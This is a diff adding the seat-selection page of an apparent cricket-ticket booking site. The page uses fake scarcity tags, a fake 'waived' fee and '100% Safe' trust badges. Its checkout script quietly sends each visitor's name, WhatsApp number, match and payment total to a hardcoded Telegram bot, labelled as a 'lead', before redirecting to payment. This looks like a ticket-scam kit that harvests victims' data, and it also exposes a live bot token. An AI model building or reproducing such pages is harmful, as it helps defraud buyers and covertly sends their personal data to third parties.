@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Select Seats</title>
+
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '1252040857081560');
+    fbq('track', 'PageView');
+    fbq('track', 'CustomizeProduct'); 
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/>
+    </noscript>
+    
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; background: #f4f7f9; margin: 0; color: #111827; }
+        
+        .bms-header { background: #0052FF; color: white; padding: 15px 20px; display: flex; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100;}
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-icon { font-size: 28px; cursor: pointer; line-height: 1; }
+        #match-title { font-size: 16px; font-weight: 700; margin: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 80vw;}
+
+        /* 📍 Progress Stepper */
+        .stepper { display: flex; justify-content: center; align-items: center; background: #fff; padding: 12px; font-size: 11px; font-weight: 600; color: #64748b; border-bottom: 1px solid #e2e8f0; }
+        .stepper span { display: flex; align-items: center; gap: 5px; }
+        .stepper span.active { color: #0052FF; }
+        .stepper span.active svg { color: #0052FF; }
+        .stepper .line { width: 20px; height: 2px; background: #cbd5e1; margin: 0 10px; }
+
+        .seat-selection-area { padding: 15px; padding-bottom: 140px; max-width: 500px; margin: auto; }
+        
+        .venue-container { width: 100%; background: #fff; border-radius: 16px; overflow: hidden; border: 1px solid #e2e8f0; box-shadow: 0 4px 15px rgba(0,0,0,0.03); margin-bottom: 25px; padding: 10px; box-sizing: border-box;}
+        #venue-img { width: 100%; height: auto; max-height: 250px; object-fit: contain; display: none; border-radius: 10px;}
+        
+        .section-title { font-size: 16px; font-weight: 800; margin-bottom: 15px; color: #0f172a; text-transform: uppercase; letter-spacing: 0.5px;}
+        
+        /* 🔥 Ultra Premium Seat Cards */
+        .type-card { position: relative; background: #fff; border-radius: 14px; padding: 18px 20px; margin-bottom: 15px; cursor: pointer; border: 2px solid #e2e8f0; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(0,0,0,0.02); display: flex; justify-content: space-between; align-items: center; overflow: hidden;}
+        
+        .type-card:hover { border-color: #cbd5e1; transform: translateY(-2px); }
+        .type-card.selected { border-color: #00cf7f; background: #f0fdf4; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.15); }
+        
+        .card-left { text-align: left; }
+        .type-card h3 { margin: 0; font-size: 15px; color: #1e293b; font-weight: 700; display: flex; align-items: center; gap: 8px;}
+        .type-card p { margin: 0; font-weight: 800; color: #f84464; font-size: 18px; } /* Set color to match screenshot */
+        
+        /* Features/Benefits List */
+        .benefits { margin: 6px 0 0 0; padding: 0; list-style: none; font-size: 11px; color: #64748b; }
+        .benefits li { margin-bottom: 3px; display: flex; align-items: center; gap: 4px;}
+        .benefits li::before { content: '✓'; color: #00cf7f; font-weight: bold; }
+
+        /* FOMO Tags */
+        .fomo-tag { position: absolute; top: -1px; right: 15px; background: #f84464; color: white; font-size: 9px; font-weight: 800; padding: 4px 8px; border-radius: 0 0 6px 6px; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 2px 5px rgba(248, 68, 100, 0.3); }
+        .tag-orange { background: #f59e0b; box-shadow: 0 2px 5px rgba(245, 158, 11, 0.3); }
+        
+        /* 👑 VIP Cards Styling */
+        .card-vip { background: linear-gradient(145deg, #111827 0%, #1f2937 100%); border: 2px solid #374151; color: white; }
+        .card-vip h3 { color: #fbbf24; }
+        .card-vip p { color: #f84464; } 
+        .card-vip .benefits { color: #9ca3af; }
+        .card-vip.selected { border-color: #fbbf24; background: linear-gradient(145deg, #111827 0%, #374151 100%); box-shadow: 0 8px 25px rgba(251, 191, 36, 0.2); }
+
+        /* Summary Card */
+        .summary-card { background: #fff; border-radius: 16px; padding: 20px; margin-top: 25px; border: 1px dashed #cbd5e1; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
+        .sum-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; font-size: 14px; color: #475569; }
+        .sum-val { font-weight: 700; color: #0f172a; }
+        .fee-row { font-size: 12px; color: #64748b; }
+        
+        .qty-box { display: flex; align-items: center; gap: 15px; background: #f1f5f9; padding: 5px 10px; border-radius: 50px; border: 1px solid #e2e8f0;}
+        .q-btn { width: 28px; height: 28px; border-radius: 50%; border: none; background: #fff; color: #0f172a; font-weight: bold; font-size: 16px; cursor: pointer; display: flex; justify-content: center; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); transition: 0.2s;}
+        .q-btn:active { transform: scale(0.9); background: #e2e8f0; }
+        
+        .total-row { border-top: 2px dashed #e2e8f0; padding-top: 15px; margin-top: 5px; color: #1e293b; font-weight: 800; font-size: 18px; }
+
+        /* 🛡️ Trust Footer */
+        .trust-footer { margin-top: 25px; display: flex; justify-content: space-around; font-size: 10px; color: #64748b; font-weight: 600; text-transform: uppercase; }
+        .trust-footer div { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+        .trust-footer svg { width: 18px; height: 18px; color: #94a3b8; }
+
+        /* Sticky Bottom Checkout Bar */
+        .bottom-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 15px 20px; box-sizing: border-box; box-shadow: 0 -5px 20px rgba(0,0,0,0.08); display: flex; justify-content: center; z-index: 1000; border-top: 1px solid #e2e8f0;}
+        .book-now-btn { width: 100%; max-width: 420px; padding: 16px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: 0.3s; text-transform: uppercase; letter-spacing: 0.5px;}
+        .book-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3); }
+        .book-now-btn.active:hover { transform: translateY(-2px); }
+    </style>
+</head>
+<body class="mobile-layout bg-white">
+
+    <header class="bms-header">
+        <div class="header-left">
+            <span class="back-icon" onclick="window.history.back()">&#8249;</span>
+            <h1 id="match-title">Loading...</h1>
+        </div>
+    </header>
+
+    <div class="stepper">
+        <span style="color: #10b981;">✔ Match</span>
+        <div class="line" style="background: #10b981;"></div>
+        <span class="active">
+            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            Select Seats
+        </span>
+        <div class="line"></div>
+        <span>Payment</span>
+    </div>
+
+    <div class="seat-selection-area">
+        <div class="venue-container">
+            <img id="venue-img" src="" alt="Stadium Layout">
+        </div>
+
+        <h2 class="section-title">Select Seat Category</h2>
+
+        <div class="seat-types">
+            
+            <div class="type-card" onclick="setSeat('General Stand', 599, this)">
+                <div class="card-left">
+                    <h3>🪑 General Stand</h3>
+                    <ul class="benefits">
+                        <li>Standard stadium seating</li>
+                        <li>Good view of the ground</li>
+                    </ul>
+                </div>
+                <p>₹599</p>
+            </div>
+            
+            <div class="type-card" onclick="setSeat('Premium Stand', 999, this)">
+                <div class="fomo-tag tag-orange">🎟️ Best Seller</div>
+                <div class="card-left">
+                    <h3>⭐ Premium Stand</h3>
+                    <ul class="benefits">
+                        <li>Comfortable seating area</li>
+                        <li>Better view angle</li>
+                    </ul>
+                </div>
+                <p>₹999</p>
+            </div>
+            
+            <div class="type-card" onclick="setSeat('Pavilion Stand', 1599, this)">
+                <div class="card-left">
+                    <h3>🛋️ Pavilion Stand</h3>
+                    <ul class="benefits">
+                        <li>Closer to the pitch</li>
+                        <li>Exclusive entry access</li>
+                    </ul>
+                </div>
+                <p>₹1,599</p>
+            </div>
+
+            <div class="type-card card-vip" onclick="setSeat('VIP Stand', 1999, this)">
+                <div class="fomo-tag">🔥 Fast Filling</div>
+                <div class="card-left">
+                    <h3>👑 VIP Stand</h3>
+                    <ul class="benefits">
+                        <li>Premium cushioned seats</li>
+                        <li>Fast-track VIP entry</li>
+                    </ul>
+                </div>
+                <p>₹1,999</p>
+            </div>
+
+            <div class="type-card card-vip" onclick="setSeat('Corporate Box', 2599, this)">
+                <div class="card-left">
+                    <h3>🏢 Corporate Box</h3>
+                    <ul class="benefits">
+                        <li>Air-Conditioned seating</li>
+                        <li>Complimentary light snacks</li>
+                    </ul>
+                </div>
+                <p>₹2,599</p>
+            </div>
+
+            <div class="type-card card-vip" onclick="setSeat('Hospitality Box', 2999, this)">
+                <div class="card-left">
+                    <h3>🥂 Hospitality Box</h3>
+                    <ul class="benefits">
+                        <li>Luxury dining experience</li>
+                        <li>Dedicated hospitality service</li>
+                    </ul>
+                </div>
+                <p>₹2,999</p>
+            </div>
+
+            <div class="type-card card-vip" onclick="setSeat('Skybox/Lounge', 3999, this)">
+                <div class="fomo-tag tag-orange">⚡ Only Few Left</div>
+                <div class="card-left">
+                    <h3>💎 Skybox/Lounge</h3>
+                    <ul class="benefits">
+                        <li>Ultimate luxury panoramic view</li>
+                        <li>Exclusive VIP Lounge & Parking</li>
+                    </ul>
+                </div>
+                <p>₹3,999</p>
+            </div>
+
+        </div>
+
+        <div class="summary-card">
+            <div class="sum-row"><span>Seat Category:</span> <span id="res-type" class="sum-val" style="color:#0052FF;">None</span></div>
+            <div class="sum-row"><span>Price per Ticket:</span> <span id="res-price" class="sum-val">₹0</span></div>
+            <div class="sum-row">
+                <span>Total Seats:</span>
+                <div class="qty-box">
+                    <button class="q-btn" onclick="updateQty(-1)">-</button>
+                    <span id="res-qty" class="sum-val" style="width: 15px; text-align: center;">1</span>
+                    <button class="q-btn" onclick="updateQty(1)">+</button>
+                </div>
+            </div>
+            <div class="sum-row fee-row">
+                <span>Platform Fee:</span>
+                <span style="color:#10b981; font-weight:700;"><del style="color:#94a3b8; font-weight:500;">₹150</del> Waived</span>
+            </div>
+            
+            <div class="sum-row total-row">
+                <span>Total Payable:</span>
+                <span id="res-total" style="font-size: 22px;">₹0</span>
+            </div>
+        </div>
+
+        <div class="trust-footer">
+            <div>
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                <span>100% Safe</span>
+            </div>
+            <div>
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                <span>M-Ticket</span>
+            </div>
+            <div>
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                <span>Verified</span>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="bottom-bar">
+        <button id="final-btn" class="book-now-btn" disabled onclick="goNext()">Select a Seat</button>
+    </div>
+
+    <script>
+        const rawData = localStorage.getItem('selectedMatch');
+        if (rawData) {
+            const match = JSON.parse(rawData);
+            document.getElementById('match-title').innerText = match.title || "Match Details";
+            
+            const imgEl = document.getElementById('venue-img');
+            const imageUrl = match.venue_img || match.banner;
+            if (imageUrl) {
+                imgEl.src = imageUrl;
+                imgEl.style.display = 'block';
+            }
+        }
+
+        window.sPrice = 0;
+        window.sQty = 1;
+
+        window.setSeat = (name, price, el) => {
+            document.querySelectorAll('.type-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            window.sPrice = price;
+            document.getElementById('res-type').innerText = name;
+            
+            // Format price with comma properly
+            document.getElementById('res-price').innerText = `₹${price.toLocaleString('en-IN')}`;
+            
+            const btn = document.getElementById('final-btn');
+            btn.disabled = false;
+            btn.classList.add('active');
+            btn.innerText = "Continue to Payment";
+            refreshTotal();
+        };
+
+        window.updateQty = (val) => {
+            let n = window.sQty + val;
+            
+            // 🚫 Smart Alert for Security
+            if(n > 10) {
+                alert("Maximum 10 seats allowed per transaction for security reasons.");
+                return;
+            }
+            if(n < 1) return; // Prevent 0 seats
+
+            window.sQty = n;
+            document.getElementById('res-qty').innerText = n;
+            refreshTotal();
+        };
+
+        function refreshTotal() {
+            const total = window.sQty * window.sPrice;
+            document.getElementById('res-total').innerText = `₹${total.toLocaleString('en-IN')}`;
+            localStorage.setItem("finalPrice", total); 
+            // Save details for Telegram
+            localStorage.setItem("selectedSeatType", document.getElementById('res-type').innerText);
+            localStorage.setItem("seatQuantity", window.sQty);
+        }
+
+        // 🔥 THE ULTIMATE REDIRECT FUNCTION WITH TELEGRAM & LOADER 🔥
+        window.goNext = () => { 
+            if (window.sPrice > 0) {
+                
+                // 1. Button Block karo
+                const btn = document.getElementById('final-btn');
+                if(btn) {
+                    btn.innerText = "Processing...";
+                    btn.style.pointerEvents = "none";
+                }
+
+                // 2. Loading Spinner Dikhao
+                const loader = document.createElement('div');
+                loader.innerHTML = `
+                    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
+                        <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
+                        <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
+                        <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
+                        <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                    </div>
+                `;
+                document.body.appendChild(loader);
+
+                // 3. Telegram Data Nikaalo
+                const name = localStorage.getItem('customerName') || "Unknown";
+                const phone = localStorage.getItem('customerPhone') || "Unknown";
+                const matchTitle = document.getElementById('match-title').innerText || "IPL Match";
+                const seatType = document.getElementById('res-type').innerText;
+                const totalAmt = window.sQty * window.sPrice;
+
+                // Aapka Token & Chat ID
+                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+                const chatId = "6820660513"; 
+                
+                const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${seatType}\n💵 Total Amount: ₹${totalAmt}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+
+                // 4. Message Bhejo Aur Phir details.html par bhej do
+                fetch(url).then(() => {
+                    window.location.href = "details.html";
+                }).catch(() => {
+                    window.location.href = "details.html";
+                });
+
+                // Fail-safe (Agar net atak gaya toh bhi aage bhej dega 1.2s mein)
+                setTimeout(() => {
+                    window.location.href = "details.html";
+                }, 1200);
+
+            } else {
+                alert("Kripya pehle seat type select karein!");
+            }
+        };
+    </script>
+
+    <script type="module" src="js/seats.js"></script>
+
+</body>
+</html>
